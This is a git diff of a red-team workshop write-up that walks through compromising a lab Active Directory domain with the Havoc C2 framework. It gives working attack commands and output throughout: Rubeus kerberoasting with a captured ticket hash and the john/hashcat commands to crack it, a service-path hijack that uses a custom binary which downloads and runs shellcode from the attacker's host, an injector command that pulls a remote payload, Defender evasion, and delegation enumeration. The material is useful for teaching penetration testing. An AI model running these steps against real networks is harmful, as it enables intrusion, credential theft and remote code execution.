@@ -1,5 +1,5 @@
 ---
-title: "Red Teaming: HAVOC 101 Workshop"
+title: "Red Team Ops: HAVOC 101 Workshop"
 ---
 HAVOC C2, Active Directory, and Red Teaming.
 
@@ -7,49 +7,49 @@ HAVOC C2, Active Directory, and Red Teaming.
 
 ![image](https://user-images.githubusercontent.com/107750005/221825520-4e5e2a23-3deb-435d-8445-30bc0f17bad3.png)
 
-A short recap about the workshop. The **"Red Team Ops: HAVOC 101"** is a 3-hours workshop that discusses about red teaming techniques and C2C concepts, and it is an honour to attend this session as a speaker with [Wesley](https://github.com/WesleyWong420). This workshop covers 3 main chapters:
+A short recap about the workshop. **"Red Team Ops: HAVOC 101"** is a 3-hours workshop that cover topics about red teaming techniques and Command-and-Control concepts, and it is an honour to host this session as a speaker with [Wesley](https://github.com/WesleyWong420). This workshop covers 3 main chapters:
 - Chapter 1: Introduction to Command & Control Framework
 - Chapter 2: OPSEC & Defense Evasion
 - Chapter 3: Compromise Active Directory Domain Services
 
-[Chapter 1 & 2](https://github.com/WesleyWong420/RedTeamOps-Havoc-101) had been conducted by Wesley. However, the last chapter had not yet been completed physically due to time limitation. Therefore, I decided to write a complete guide on how to compromise a simple AD network as an alternative.
+[Chapter 1 & 2](https://github.com/WesleyWong420/RedTeamOps-Havoc-101) had already been conducted by Wesley. However, the last chapter had not yet been completed physically due to time limitation. Therefore, I decided to write a complete guide on how to compromise a simple AD network as an alternative.
 
 ## 🪟 Active Directory
-In an organization or a university, you will realize you are able to login most of the domain computers with your own credentials and always able to get your desktop back to work even if the devices are located in places such as the library and other classrooms. This is the capability of **Active Directory (AD)**. 
+In an organization or a university, you are able to login into domain computers that you have access with your own credentials. At the same time, you can also access your workstation anytime regardless of their physical location. This is done possible thanks to the capabilities of **Active Directory (AD)**. 
 
-Active Directory is a database or set of services that connects users with the network resources they need to complete their daily work. Critical information is stored in AD such as **users**, **computers**, and **roles**. In terms of security configurations, AD provides flexibility on different aspects of defense measures and services such as Group Policy Management, Key Distribution Center (KDC), User Access Permissions, for Administrators to reduce their workloads and apply standard protection against potential threats.
+Active Directory is a database or set of services that connects users with the network resources they need to complete their daily work. Critical information is stored in AD, such as **users**, **computers**, and **roles**. In terms of security configurations, AD provides flexibility on different aspects of defense measures and services such as Group Policy Management, Key Distribution Center (KDC), User Access Permissions, for Administrators to reduce their workloads and apply standard protection against potential threats.
 
-Some terminologies in an AD are good to know including:
+Here are some terminologies that are exclusive to an Active Directory network includes:
 
 - `Forest`: The largest view of the Active Directory. Collection of `Trees`.
 - `Tree`: Collection of `Domains`.
 - `Domain`: Collection of `Organization Units (OUs)` and `Objects`.
 - `OUs`: Collection of `Objects`.
 - `Object`: Such as `Domain Admins`, `Domain Controllers`, `Domain Computers`, `Domain Users`, etc.
-- `Domain Admins`: The "bosses" of a specific domain as a **USER**. They had full access of all network resources in the domain.
-- `Domain Controllers`: The "bosses" of a specific domain as a **COMPUTER**. These computers able to manage and control all network resources in the domain.
+- `Domain Admins`: The "bosses" of a specific domain as a **USER**. They have full access to all network resources in a domain.
+- `Domain Controllers`: The "bosses" of a specific domain as a **COMPUTER**. These computers can manage and control all network resources in the domain.
 - `Domain Computers`: Workstations in a specific domain.
 - `Domain Users`: Clients in a specific domain. They only had limited access in the domain.
 
 ## 🎟️ Kerberoasting
-> Crash course of understanding Kerberos authentication protocol.
+> Crash course for Kerberos authentication protocol.
 
 ![image](https://user-images.githubusercontent.com/107750005/221415624-f7b2ed9c-c9a9-4ec3-ad85-7583aca1f0f0.png)
 
-1. When a `client` wants to login to a domain computer, this event will be verified by the `authentication server`.
-2. After the `authentication server` had verified the existence of the credentials of the `client` in the `SQL Server`. It returns a TGT back to the `client`.
-3. The `client` then send the TGT to the `TGS`, requesting access permission of the `network resources` in the domain.
-4. The `TGS` knows the `client` is authenticated and it will respond back a client-to-server ticket to the `client`.
-5. The client-to-server ticket can be used for requesting specific services in the domain.
-6. Services will be provided from the `network resources` in the domain.
+1. Whenever a `client` initiates an authentication request (login) to a domain computer, this event will be verified by the `authentication server`.
+2. After the `authentication server` had verified the existence and validity of credentials provided by the `client` from the `SQL Server`, tt returns a Ticket Granting Ticket (TGT) back to the `client`.
+3. The `client` then sends the TGT to a `TGS`, requesting access permission for the `network resources` in the domain.
+4. The `TGS` acknowledges that the `client` is authenticated and in turn responds back with a client-to-server ticket to the `client`.
+5. The client-to-server ticket can then be used for requesting specific services in the domain.
+6. Access to services are granted by the `network resources` in the domain.
 
-> A ticket-granting-ticket (TGT) acts as a universal pass for accessing all the `Network Resources` in the domain instead of inserting username and password over and over again.
+> A ticket-granting-ticket (TGT) acts as a universal pass for accessing all the `Network Resources` in the domain instead of providing a username and password over and over again.
 
 **Kerberos** is a crucial topic and contains some of the more well-known abuse primitives within Active Directory environments. It can also be a bit elusive as to how it works since it has so many complex intricacies.
 
-Services run on a machine under the context of a user account.  These accounts are either local to the machine (NT AUTHORITY\SYSTEM, NT AUTHORITY\LOCAL SERVICE, NT AUTHORITY\NETWORK SERVICE) or are domain accounts (e.g. HAVOC\s.chisholm).  A Service Principal Name (SPN) is a unique identifier of a service instance.  SPNs are used with Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD.
+Services run on a machine under the context of a user account.  These accounts are either local to the machine (NT AUTHORITY\SYSTEM, NT AUTHORITY\LOCAL SERVICE, NT AUTHORITY\NETWORK SERVICE) or domain accounts (e.g. HAVOC\s.chisholm).  A Service Principal Name (SPN) is a unique identifier for a service instance.  SPNs are used with Kerberos to associate a service instance with a logon account, and are configured as an User Object in AD.
 
-Part of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service.  Kerberoasting is a technique for requesting TGS’ for services running under the context of domain accounts and cracking them offline to reveal their plaintext passwords.  Rubeus ***kerberoast*** can be used to perform the kerberoasting.  Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt).
+Part of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service.  Kerberoasting is a technique for requesting TGS’ for services running under the context of domain accounts, and then cracking them offline to reveal their plaintext passwords.  Rubeus ***kerberoast*** can be used to perform Kerberoasting.  Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt).
 
 ```
 06/03/2023 15:07:08 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/Rubeus/Rubeus/bin/Debug/Rubeus.exe kerberoast /simple /nowrap
@@ -72,7 +72,7 @@ Part of the TGS returned by the KDC is encrypted with a secret derived from the 
 $krb5tgs$23$*mssql_svc$havoc.local$DC01/mssql_svc.@havoc.local*$7139EC915D3F8A6D69BDCFC70272CE72$5D9CFAABFF7F8575AFF42152D2A26E583B82B7FDE6833E0E10A895A6B652134274DE1CBFD9F430E6F7EA55D79D752D80CD1E1503B32F70942F32F3C4E709F05B0168A372EA257A1B9B7ECD2056A377679780985F8295090B6717B8E95F01B9E7DB00933E85755D5DF4AFF80E3ED5B1D010F37C1A9B91345F1863C4CD34C973987317C56D169CC5128A540583C0F65AB4B6EC16F5E7230F68EA0743C2AC2912ABD0159B4518DD8165BA4994D9B1CF74BB5F2223D9BB32F41F417C7405F3551775F418899A45CACB9B13288CA9A5EB1706155C11DBAAD20703D5BD129353138ECAE4003DC49A2019BD9CE258F8ED5A1F6FFC1ACDE3CADAA64A07AF42D9ED61AC409241359135A70378D2991267628A673E37E0B849F54E5449E37265DC634C9BF9257AFC6EF0D5FEA1754B49895164DBE011FF71947991C8F8D8A0ACB4071CA1B85B51B99194BF821FC16D5968E435FE0ABCC080E7BDE9EAD02DEDF60A084ECC6C7348CF8CDF27F88614D24F81B533BE704BE4C2073D4283DAC9F2FC0220718543EC0F0F575EBEFDA26123A49B50FAC4DA6D6CCD2759061327B8DCFF9D5785A1936FAA2C1F9EA84A5BA041BBFF554FE3D4E046B2F6FF85904FD2F9BD9C27595E60B5449324B6F33AD8E6E0DA39E26985C8431D6C195B7E5F439B430F7CB5B7A478797AC25DCF692D24F2BCC3FAA531E419A0D22C13D933C106DDB8712E3664FFABDD6601AA6EC1C2C23C99425B674B9DBDF42DD388F59765ADE204C4BD30573C2818F3426750E71BA201C6912D624D70128FA2F3A092500D77223B8CF193B1D4DFC556F268AFEE63F6F803F9CCDEFA67A2DE7EF5E63F4571162153D33122CD4EBD9E9FE0E639A1FC32C491B1AC863CB91ACB9E799F5467A942EE10F7A1EB992F091689197AE5D144ADC6C6073CAC3497A553F540C579E34A247A3E2F526EF98E24BA0B1EF0B2E9A40B87063184379B130F3AE758A0C3C01F60687D1065A94FE00C1FE668BD236F537CACFA086F6664BE2C63638095900F980DA0901334A20B8EF2F15E95A1EA18DDDB60AF762C1B860F5F323F35E43D5AD7F96FA212E26DF3E941C5151896717C7CD74C52DC59847B4D05EC9DD77CEE18989BDE5125AC9CAE6F5988AF79C416DA90B0F18BE039E93D49B1C3851AC41E94562DD6540AF89D89C1BA1F61385649CA97C7BC782E06C91311CCAF8A8087584F1B0BB1B989B36DA02C96F6DC336E72EA50283BC8DCCF1872EDFD90A079E9671F5FB9BF74DF4546C03B8745EE3DBC6899742B2881A455DB77D8BAABCBF39F7CAF6421761C49B2DC8C3C4A30DC676424AC51BE8A83C6C451CEDBB31251BF7A910509E621112854FA8AA1A071FCAE7EF13D370FC1ED5D7790E2F5511A46165921585EE98E4FA96B5C3C7C2D5C67988520E98804531EA658DB2D339911BDFC59E3EA8BA34C687C461C16DA23DB9F51387D53DE3E2FFBC18D83F3630D39112F90B2B708FA934C0AA579A29AFB1224E999AAE634EBEAC0728BE2D307CCA23F2DCB8427C445A4E1FCC7B620F64D203A44413F1AB748F5E238F9E8B4AE53338AA94020417306C5CF847AFD9B5BD9A5CC27726B6DE8F4B57C9749A73567954C86E2803C795FC4372F711D3F3820D285A1A636B4DB20BC61812D45DF8F1122AEBF014289D46FAB31F82296DCA7BC2CB401675F9A1145393BD4008852F3AF7D44FBE865E7D805F852C390A83857C0A73D3F9A3184ECFC3D3FE3C1E943BFF6996738B9A42EA49963F77F3FE755
 ```
 
-The hash can be cracked offline to recover the plaintext password for the account (HAVOC\mssql_svc).  Use `--format=krb5tgs --wordlist=wordlist <hash>` for john or `-a 0 -m 13100 <hash> <wordlist>` for hashcat.
+The hash can be cracked offline to recover the plaintext password for the account (HAVOC\mssql_svc).  Use `--format=krb5tgs --wordlist=wordlist <hash>` for John the Ripper or `-a 0 -m 13100 <hash> <wordlist>` for Hashcat.
 
 ```
 $ john --format=krb5tgs --wordlist=wordlist mssql_svc
@@ -80,37 +80,37 @@ Password123!       (mssql_svc$havoc.local)
 ```
 
 ## 💻 Network Verification
-Before moving on to the walkthrough, I want to ensure the AD network (DC01, WORKSTATION-01, WORKSTATION-02) is connected as intended. Hence, it is recommended doing the following verifications:
+Before the practical walkthrough, ensure the AD network (DC01, WORKSTATION-01, WORKSTATION-02) are interconnected as intended. Hence, it is recommended to perform the following verifications:
 
-**1) Ensure the Domain Computers are attached to the Domain Controller.**
+**1) Ensure that Domain Computers are attached to the Domain Controller.**
 
 Type the following command `nltest /sc_query:havoc.local` in both workstations to ensure domain connection. If the output contains the wording **Flags: 30 HAS_IP HAS_TIMESERV** and **Trusted DC Name \\\\DC01.havoc.local**, the specific workstation is connected to the `DC01` successfully. Otherwise, it is not connected to `havoc.local` domain.
 
 ![WORKSTATION-01](https://media.giphy.com/media/eYMHsWjNsUiHcbexQa/giphy.gif)
 ![WORKSTATION-02](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExN2RkODRmZGMzZjc3NTIyNGI5Yjk1OWExNDdlNmUxMGY1YTMxMGI5ZSZjdD1n/6Ruy61n5BLVgmsgSTD/giphy.gif)
 
-Next, go to ***Start Menu > Type "Firewall"***. At the Domain networks, please verify the **Active domain networks:** is `havoc.local`. If the active domain network is ***None***, the specific workstation is not really joining the domain network.
+Next, go to ***Start Menu > Type "Firewall"***. At the Domain networks, please verify that the **Active domain networks:** is `havoc.local`. If the active domain network is ***None***, this means that the specific workstation is not joined to the domain network.
 
 ![WORKSTATION-01](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNTc0NDg3NmJiZmY4NTU2OWM5YzRiMzI5YzJhM2NmZDU2YmE0OTY0YyZjdD1n/K4eQBRdvfSqYfJ9IIK/giphy.gif)
 ![WORKSTATION-02](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNGExMTM3ODY1NDM2MmYwZGVmODFiOGZmN2EwZDQ3N2U3NGM2YTc3MSZjdD1n/mOihdfEJ33tWlmIELf/giphy.gif)
 
-**2) Ensure the Domain Computers can communicated each other in the domain.**
+**2) Ensure that the Domain Computers can communicate with each other in the domain.**
 
-In **WORKSTATION-01** Windows Defender Firewall, click ***Advanced settings > Inbound Rules > File and Printer Sharing (Echo Request - ICMPv4-In)***, enable all the rules with the ICMPv4-In **(Enabled: "Yes")**. Do the same verification in **WORKSTATION-02**.
+In **WORKSTATION-01** Windows Defender Firewall, click ***Advanced settings > Inbound Rules > File and Printer Sharing (Echo Request - ICMPv4-In)***, enable all the rules with ICMPv4-In **(Enabled: "Yes")**. Perform the same steps of verification in **WORKSTATION-02**.
 
 ![WORKSTATION-01](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExODU4NjI5ZDUwNTk1NGFiMDkzNmM2NDk0YzEzNzNjOTg2ZTE2NzM4MyZjdD1n/o3ieXUduyKrBX2penp/giphy.gif)
 ![WORKSTATION-02](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMTEyMTEzMGFiNjdkMTcyNTFmY2M0YTQ3Njk3MmM3NzM0ZGQ4MTIwZCZjdD1n/s12zA77hbZUE6P5FzZ/giphy.gif)
 
-In **WORKSTATION-01**, ping **DC01.havoc.local** and **WORKSTATION-02.havoc.local** to ensure communication. Do the same verification in **WORKSTATION-02**.
+In **WORKSTATION-01**, ping **DC01.havoc.local** and **WORKSTATION-02.havoc.local** to ensure communication. Perform the same verification in **WORKSTATION-02**.
 
 ![WORKSTATION-01](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZmI2ZDViODI3NWUyNTk2NjUwMzYyNTJjYzk3Mzc3MGJlYTBkNDQ0OSZjdD1n/UORuqmjegfWLSCVaZu/giphy.gif)
 ![WORKSTATION-02](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZGVhYWJhZmQxNmRiNGRjZDU4NDBmMDc0MDdhMWE1Y2Y3OTY1ODUxYSZjdD1n/pVI71iGqUx3H9NONuR/giphy.gif)
 
-**3) Ensure the VM Network Adapters are correctly applied.**
+**3) Ensure that the VM Network Adapters are applied correctly.**
 
 > **DC01.havoc.local** only has the static IP `10.10.101.131`.
 
-Type the command `ipconfig` in both workstations to verify the number of adapters added.
+Use the command `ipconfig` in both workstations to verify the number of adapters added.
 
 - **WORKSTATION-01.havoc.local**: 3 Networks ( `NAT Network`, `10.10.100.128`, `10.10.101.129` )
 - **WORKSTATION-02.havoc.local**: 2 Networks ( `10.10.100.129`, `10.10.101.132` )
@@ -118,15 +118,13 @@ Type the command `ipconfig` in both workstations to verify the number of adapter
 ![WORKSTATION-01](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZjJlZGE4ZDgxZGI5MWY4MTZmYzU4ODMzZTBhYzJkNDFkZWFmNDE5NCZjdD1n/pDK5hqDduQHjsSh6fX/giphy.gif)
 ![WORKSTATION-02](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNWQ1MDM5NTUyYjZmYWFhNjc5OTUxNDg1YjdkYWZjZDg1NzUyZDRlNyZjdD1n/SetYAeAFV0lFBNvdjV/giphy.gif)
 
-Once the verification is done, we can move on to the next section.
-
 ## 💉 Compromise AD Walkthrough
 
-> Turn off the ***Automatic Sample Submission*** in all of the VMs in the Windows Defender Security settings.
+> Turn off ***Automatic Sample Submission*** from the Windows Defender Security settings in all of the VMs.
 
 ![image](https://user-images.githubusercontent.com/107750005/222167859-1e1a9173-a3ea-41a2-9ad2-c8fd9029eb1f.png)
 
-In the scenario above, you are given 1 **Attacker Windows** with essentials tools need to be compiled, 1 **Attacker Linux** with Havoc Framework and essential tools pre-installed, and 1 low-level user credentials in **WORKSTATION-01**. All user credentials including "Domain Admins" had also been given in the course material because it is used for troubleshooting purposes and it will not be utilized during the walkthrough as all machines need to be up in order to let the attacks functional. To let the machines to be powered on 24/7, go to ***Start Menu > Search for "Power, sleep, and battery settings" > Screen and sleep > Select "Never"***
+In the scenario above, you are given an **Attacker Windows** with all the essentials tools required, **Attacker Linux** with Havoc Framework pre-installed, and access to a low-privileged user in **WORKSTATION-01**. All user credentials including "Domain Admins" had also been given in the course material because it is necessary for troubleshooting purposes, but it will not be required during the walkthrough. Addtionally, to prevent machines from auto-sleeping, go to ***Start Menu > Search for "Power, sleep, and battery settings" > Screen and sleep > Select "Never"***
 
 | Machines         | Username    | Password       |
 |------------------|-------------|----------------|
@@ -134,36 +132,36 @@ In the scenario above, you are given 1 **Attacker Windows** with essentials tool
 | Attacker Linux   | `havoc`     | `havoc`        |
 | WORKSTATION-01   | `a.tarolli` | `Password123!` |
 
-For comprimising the domain, ***5 stages*** are included which are:
+The Attack Chain is divided into ***5 stages*** as below:
 
-- Initial Access (Callback Host)
+- Initial Access
 - Local Privilege Escalation
 - Kerberoasting
 - Lateral Movement
 - Pivoting
 
 ### 📑 Initial Access
-Here is the video walkthrough regarding Setting Up an attack in Teamserver including connecting to teamserver, creating a listener, and generating a payload.
+The first video demonstrates steps for prepping our attack from the Havoc Teamserver, which includes connecting to teamserver, creating a listener, and generating a payload.
 
 {% include video id="ORPrpKvO56M" provider="youtube" %}
 
-In our initial compromise, we need to consider whether our payloads successfully bypass Windows Defender. Due to fact that Havoc default executable is heavily detected by Defender, therefore, we will use our custom injector that had been introduced in our **"Chapter 2: OPSEC and Evasion"**. We will implement 4 steps for initial access. In our case, `RatKing.exe` will be utilized.
+In our initial compromise, we need to consider whether our payloads will be flagged by Windows Defender. Default payloads generated by Havoc out-of-the-box are heavily signatured, therefore, we will use a custom process injector RatKing introduced back in **"Chapter 2: OPSEC and Evasion"** that will be implemented in 4 steps in this stage.
 
-1. Compiled `RatKing.exe` in Visual Studio in Attacker Windows.
+1. Compile `RatKing.exe` in Visual Studio from Attacker Windows.
 2. Transfer `RatKing.exe` from Attacker Windows to Attacker Linux.
 3. Transfer `RatKing.exe` from Attacker Linux to WORKSTATION-01.
 4. Run `RatKing.exe` with the syntax: `RatKing.exe -u "http://<Attacker Linux IP>:<PORT>/<Payload>" -t notepad`.
 5. Return back to Attacker Linux, check the Havoc Teamserver whether a demon is called back.
-6. If the demon is not yet spawned, check the web log in `updog` or check the syntax of `RatKing.exe` command. 
+6. If the demon is not spawned in, check the web log in `updog` or check the syntax of `RatKing.exe` command. 
 
-Here is the video walkthrough regarding Initial Access Path using custom shellcode injector.
+The second video will cover detailed walkthrough on how to operate with our custom process injector to gain initial access.
 
 {% include video id="gXnUztTydKk" provider="youtube" %}
 
 ### 🚩 Local Privilege Escalation
 An unquoted service path is where the path to the service binary is not wrapped in quotes. Why is that a problem? By itself it's not, but under specific conditions it can lead to an elevation of privilege.
 
-WMI can be used to pull a list of every service and the path to its executable. Here are some examples:
+For enumeration, WMI can be used to pull a list of services and the path to its executable. Here are some examples:
 
 ```
 06/03/2023 21:50:36 [5pider] Demon » shell wmic service get name, pathname
@@ -181,23 +179,23 @@ HAVOC Vulnerable Service                    C:\Program Files\HAVOC\binary files\
 VMTools                                     "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
 ```
 
-We can see that the paths for **ALG**, **AppVClient**, and **GraphicsPerfSvc** are not quoted, but the path for **VMTools** is. The difference is that this latter path has spaces in them. **HAVOC Vulnerable Service** has spaces in the path and is also not quoted.
+We can see that the paths for **ALG**, **AppVClient**, and **GraphicsPerfSvc** are not quoted, but the path for **VMTools** is. The difference is that the later path has spaces in them. **HAVOC Vulnerable Service** has spaces in the path and is also unquoted.
 
-When Windows attempts to read the path to this executable, it interprets the space as a terminator. So, it will attempt to execute the following (in order):
+When Windows attempts to read the path to this executable, it interprets the space as a terminator. As a result, it will attempt to execute the following (in order):
 
 1. `C:\Program.exe`
 2. `C:\Program Files\HAVOC\binary.exe`
 3. `C:\Program Files\HAVOC\binary files\executable.exe`
 4. `C:\Program Files\HAVOC\binary files\executable files\Program.exe`
 
-If we can drop a binary into any of those paths, the service will execute it before the real one. Of course, there's no guarantee that we have permissions to write into either of them.
+If we can drop a binary into any of these directories, the service will execute it before the real one. Of course, there's no guarantee that we have permissions to write into either of them.
 
-In conclusion, **2 conditions** need to be met to launch unquoted path attacks.
+In conclusion, there are **2 conditions** that must be met for an Unquoted Path attack to be successful.
 
-- The location of the service needs to **contain spaces** and **unquoted**.
-- The specific service need to have **write permission to low-level users**.
+- The location of the service needs to **contain spaces** and must be **unquoted**.
+- Current user must have **write permission** to the binary path of the service.
 
-The shell command `icacls` cmdlet will show the permissions of various objects (including files and directories).
+Using the `icacls` cmdlet, we can enumerate the permissions of various objects (including files and directories).
 
 ```
 06/03/2023 20:28:34 [5pider] Demon » shell icacls "C:\Program Files\HAVOC\binary files"
@@ -222,9 +220,9 @@ C:\Program Files\HAVOC\binary files BUILTIN\Users:(W)
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-We can see from the output that BUILTIN\Users have write permission (W) on the `C:\Program Files\HAVOC\binary files` directory, which means we can upload a malicious binary to hijack this unquoted path.
+Based on the output, BUILTIN\Users have write permission (W) on the `C:\Program Files\HAVOC\binary files` directory, which means we can upload a malicious binary to hijack this unquoted path.
 
-[`SharpUp.exe`](https://github.com/GhostPack/SharpUp) will also list any services that match these conditions.
+[`SharpUp.exe`](https://github.com/GhostPack/SharpUp) can also be used to list any services that match these conditions.
 
 ```
 06/03/2023 16:53:34 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/SharpUp/SharpUp/bin/Debug/SharpUp.exe audit
@@ -247,7 +245,7 @@ We can see from the output that BUILTIN\Users have write permission (W) on the `
 [*] Completed Privesc Checks in 41 seconds
 ```
 
-Payloads to abuse services must be specific "service binaries", because they need to interact with the Service Control Manager.  When generating the payload, the payload format **Windows Service EXE** will be selected in Havoc Teamserver. However, the default payload option provided by Havoc Framework has the risk to get detected by Windows Defender. Therefore, we will utilize our own custom service binary `ServiceExec.exe` to hijack the path. (The `ServiceExec.exe` had been provided in the Attacker Windows)
+Payloads to abuse services must be specific "service binaries", because they need to interact with the Service Control Manager.  When generating the payload, the payload format **Windows Service EXE** must be selected from the Havoc Teamserver. However, the default payload out-of-the-box generated by Havoc has the risk of getting detected by Windows Defender. Therefore, we will utilize our own custom service binary `ServiceExec.exe` to hijack the path. (`ServiceExec.exe` is provided in Attacker Windows)
 
 ```
 byte[] shellcode = { };
@@ -270,11 +268,11 @@ using (var handler = new HttpClientHandler())
 }
 ```
 
-Open `ServiceExec.sln` in Visual Studio, navigate to the following code block above. Change the following line `shellcode = await client.GetByteArrayAsync("http://192.168.25.129:9090/demon.bin");` to your Attacker Linux IP, Port, and Payload Name.
+Open `ServiceExec.sln` in Visual Studio and navigate to the following code block above. Change the following line `shellcode = await client.GetByteArrayAsync("http://192.168.25.129:9090/demon.bin");` to your Attacker Linux IP, Port, and Name for the raw shellcode.
 
-After that, build the Solution and transfer to your Attacker Linux.
+After that, build the Solution and transfer it to your Attacker Linux.
 
-In **a.tarolli/WORKSTATION-01** demon, navigate to the vulnerable path, upload, and rename it to `executable.exe`.
+In the **a.tarolli/WORKSTATION-01** demon, navigate to the vulnerable path, upload, and rename it to `executable.exe`.
 
 ```
 06/03/2023 16:55:06 [5pider] Demon » cd C:\Program Files
@@ -307,7 +305,7 @@ In **a.tarolli/WORKSTATION-01** demon, navigate to the vulnerable path, upload, 
 [*] List Directory: .\executable.exe (67072)
 ```
 
-Before starting the service, launch a HTTP Server pointing the `demon.bin` payload where you stored using `updog` command. Updog will automatically assign port 9090 as the HTTP port. In my case, the payload is stored in `/home/havoc/Desktop/Payloads/` directory.
+Before starting the service, launch a HTTP Server (Updog) from a directory that is serving `demon.bin`. Updog will automatically assign port 9090 as the HTTP port. In my case, the payload is stored in the `/home/havoc/Desktop/Payloads/` directory.
 
 ```
 06/03/2023 16:56:59 [5pider] Demon » shell sc start "HAVOC Vulnerable Service"
@@ -327,7 +325,7 @@ SERVICE_NAME: HAVOC Vulnerable Service
         FLAGS             :
 ```
 
-Completing all the step, you should get a `SYSTEM` demon after starting the **"HAVOC Vulnerable Service"**.
+Completing all the step, you should get a `SYSTEM` demon after starting **"HAVOC Vulnerable Service"**.
 
 ```
 06/03/2023 17:12:25 [5pider] Demon » token getuid
@@ -336,24 +334,24 @@ Completing all the step, you should get a `SYSTEM` demon after starting the **"H
 [+] Token User: NT AUTHORITY\SYSTEM (Admin)
 ```
 
-At this point, the first flag can be retrieved. Here is a video walkthrough regarding launching Unquoted Service Path attack.
+At this point, the first flag can be retrieved. Here is a video walkthrough covering Unquoted Service Path attack.
 
 {% include video id="TyFHmhjm5ig" provider="youtube" %}
 
-> In the video, you will see another demon is spawned using `shellcode inject x64 <pid> <local/path>`. This is used for get a stable demon if the first demon is dead. This operation is optional.
+> In the video, you might that an extra beacon is spawned in using `shellcode inject x64 <pid> <local/path>`. This is used for get a stable demon if the first demon is dead. This operation is optional.
 
 ### 💠 Kerberoasting
 Delegation allows a user or machine to act on behalf of another user to another service.  A common implementation of this is where a user authenticates to a front-end web application that serves a back-end database. The front-end application needs to authenticate to the back-end database (using Kerberos) as the authenticated user.
 
 ![image](https://user-images.githubusercontent.com/107750005/223048931-fb1b0686-6abe-4130-bd27-122cd436f4af.png)
 
-**Unconstrained delegation** is a feature that a Domain Administrator can set to any Computer inside the domain. Then, anytime a user logins onto the Computer, a copy of the TGT of that user is going to be sent inside the TGS provided by the DC and saved in memory in LSASS. So, if you have **Administrator privileges** on the machine, you will be able to dump the tickets and impersonate the users on any machine.
+**Unconstrained delegation** is a feature that can be configured to any Computers inside the domain. Anytime a user logins onto the Computer, a copy of the TGT of that user is going to be sent inside the TGS provided by the DC and saved inside the memory of LSASS. So, if you have **Administrator privileges** on the machine, you will be able to dump the tickets and impersonate the users on any machine.
 
-THerefore, if a domain admin logins inside a computer with **"Unconstrained Delegation"** feature activated, and you have **local admin privileges** inside that machine, you will be able to dump the ticket and impersonate the Domain Admin anywhere (Domain Privilege Escalation).
+THerefore, if a domain admin logins to a computer with **"Unconstrained Delegation"** enabled, and you have **local admin privileges** on that machine, you will be able to dump the ticket and impersonate the Domain Admin to access any other machines (Domain Privilege Escalation).
 
-In our case, we had already retrieved a `SYSTEM` account which count as a high integrity demon. Therefore, we are able to launch this attack if `m.seitz` had login into **WORKSTATION-01** before. We want the user `m.seitz` is because he is local administrator in **WORKSTATION-02**.
+Using our High Integrity session as `SYSTEM`, we are able to verify whether the user `m.seitz` has an active logon session on **WORKSTATION-01**. `m.seitz` is our point of interest since he is a local administrator on **WORKSTATION-02**.
 
-First, we can check our permission before impersonating `m.seitz` by listing the directory of **WORKSTATION-02** in `SYSTEM` demon. You are expected to get a permission error.
+First, we can check our permission before impersonating `m.seitz` by listing the directory of **WORKSTATION-02** from the `SYSTEM` demon. You are expected to get a permission error.
 
 ```
 06/03/2023 15:15:39 [5pider] Demon » dir \\WORKSTATION-02.havoc.local\C$
@@ -362,9 +360,9 @@ First, we can check our permission before impersonating `m.seitz` by listing the
 [!] Win32 Error: ERROR_ACCESS_DENIED [5]
 ```
 
-For enumeration, [`ADSearch.exe`](https://github.com/tomcarver16/ADSearch) has fewer built-in searches compared to PowerView and SharpView, but it does allow you to specify custom Lightweight Directory Access Protocol (LDAP) searches. These can be used to identify entries in the directory that match a given criteria.
+For enumeration, [`ADSearch.exe`](https://github.com/tomcarver16/ADSearch) has fewer built-in searches compared to PowerView and SharpView, but it does allow you to specify custom Lightweight Directory Access Protocol (LDAP) searches. These features altogether can be used to identify entries in the directory that match a given criteria.
 
-This query will return all computers that are permitted for unconstrained delegation.
+This query will return all computers that have unconstrained delegation configured.
 
 ```
 06/03/2023 15:40:29 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/ADSearch/ADSearch/bin/Debug/ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
@@ -395,11 +393,11 @@ GitHub: @tomcarver16
 	[+] operatingsystem : Windows 11 Pro
 ```
 
-> The argument `userAccountControl:1.2.840.113556.1.4.803:=524288` in `ADSearch.exe` is the representation for searching unconstrained delegation objects.
+> The argument `userAccountControl:1.2.840.113556.1.4.803:=524288` in `ADSearch.exe` is the representation of searching for unconstrained delegation objects.
 
-[`SharpView.exe`](https://github.com/tevora-threat/SharpView) is another tool for domain enumeration and it was designed to be a C# port of PowerView. Therefore, it has much the same functionality. However, one downside is that it doesn't have the same piping ability as PowerShell.
+[`SharpView.exe`](https://github.com/tevora-threat/SharpView) is another tool for domain enumeration and it was designed to be a C# port of PowerView. Therefore, it has pretty much the same functionality. However, one downside is that it doesn't have the same piping ability as PowerShell.
 
-This query will also return all computers that are permitted for unconstrained delegation.
+This query will also return all computers that are misconfigured with unconstrained delegation.
 
 ```
 06/03/2023 15:41:45 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/SharpView/SharpView/bin/Debug/SharpView.exe Get-NetComputer -Unconstrained
@@ -449,7 +447,7 @@ dscorepropagationdata          : 1/1/1601 12:00:00 AM
 msds-supportedencryptiontypes  : 28
 ```
 
